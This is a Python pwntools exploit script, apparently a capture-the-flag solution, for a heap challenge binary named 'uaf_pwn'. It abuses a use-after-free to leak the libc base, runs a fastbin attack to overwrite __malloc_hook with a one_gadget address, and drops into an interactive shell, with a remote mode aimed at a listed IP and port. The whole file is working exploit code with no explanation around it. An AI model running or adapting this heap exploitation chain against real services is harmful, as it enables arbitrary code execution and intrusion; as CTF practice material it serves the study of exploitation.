#!/usr/bin/env python
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./uaf_pwn')
    elf = ELF('./uaf_pwn')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('82.157.5.28', 51004)
    elf = ELF('./uaf_pwn')
    libc = ELF('./libc6_2.23-0ubuntu11.2_amd64.so')

def choice(c):
    p.sendlineafter('>', str(c))

def add(sz):
    choice(1)
    p.sendlineafter('size>', str(sz))

def delete(idx):
    choice(2)
    p.sendlineafter('index>', str(idx))

def edit(idx, data):
    choice(3)
    p.sendlineafter('index>', str(idx))
    p.sendlineafter('content>', data)

def show(idx):
    choice(4)
    p.sendlineafter('index>', str(idx))

# leak libc
add(0x400) # 0
add(0x68) # 1
delete(0)
show(0)
malloc_hook = u64(p.recv(6).ljust(8, '\x00')) - 0x68
libc_base = malloc_hook - libc.symbols['__malloc_hook']
info('libc_base = ' + hex(libc_base))

# write __malloc_hook
delete(1)
edit(1, p64(malloc_hook - 0x23))
add(0x68) # 2
add(0x68) # 3
if local:
    one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
else:
    one_gadgets = [0x45226, 0x4527a, 0xf0364, 0xf1207]
one_gadget = libc_base + one_gadgets[1]
edit(3, '\x00' * 0x13 + p64(one_gadget))
add(0x10)

#gdb.attach(p)

p.interactive()

